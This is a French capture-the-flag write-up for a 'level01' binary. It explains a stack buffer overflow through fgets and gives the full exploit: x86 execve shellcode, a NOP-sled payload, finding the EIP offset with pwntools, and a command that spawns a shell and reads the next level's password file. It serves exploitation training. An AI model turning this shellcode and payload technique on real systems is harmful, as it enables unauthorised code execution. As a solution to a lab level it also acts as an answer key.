La faille se trouve dans le fait que les fgets lisent plus loin que la taille de la variable quu'ils doivent remplir, ca va nous permettre de faire un overflow
il ny a pas de shell exectuer directement dans le code, on devra donc passer par un shellcode : \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

on va mettre ce shell code dans la premiere variable a_user_name, c'est une variable global donc placer dans la heap, c'est un bon endroit ou le placer car cette adresse ne bougera pas
on peut construire la premiere parti du payload
on commence par "dat_wil" pour passer a la prochaine etape et on remplit avec des instruction null : "\x90" et on finit par le shellcode
donc la premiere parti du payload sera ca :
"dat_wil" + "\x90"*227 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
227 car 256 - (21 du shellcode) - (7 charatere de "dat_wil") = 228 et on retire 1 pour le \0

Maintenant pour la seconde parti du payload
on va devoir trouver la bonne offset pour remplacer EIP et le rediriger vers l'adresse de notre a_user_name ou on a placer notre shellcode
Il faut donc trouver l'adresse de a_user_name :

objdump -t level01
...
0804a040 g     O .bss	00000064              a_user_name
...

l'adresse de a_user_name est : 0x0804a040

il faut trouver l'offset pour atteindre eip
on va utiliser un pattern fourni par la librerie pwtool en python :
python -c 'from pwn import *; print(cyclic(200))'
ca donne : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
on lance level1 avec gdb :

(gdb) r
(gdb) dat_wil
(gdb) aaaabaaacaaadaaaeaaafaa...
Program received signal SIGSEGV, Segmentation fault.
0x61616175 in ?? ()
on va trouver l'offset grace ou pattern decodeur :
python -c 'from pwn import *; print(cyclic_find(0x61616175))'
ca nous donne 80.
il faut donc 80 octet a partir de la variable s pour ecrire dans EIP
On a a present tout ce qu'il faut pour construire la seconde partie du payload :
"e"*80 + "\x40\xa0\x04\x08" (80 caracteres + l'adresse de a_user_name) en little edian
Le payload entier sera :
python -c 'print "dat_wil" + "\x90"*227 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "e"*80 + "\x40\xa0\x04\x08"' > /tmp/payload

cat /tmp/payload - | ./level01

On a donc reussi a lancer un shell.

cat /home/users/level02/.pass
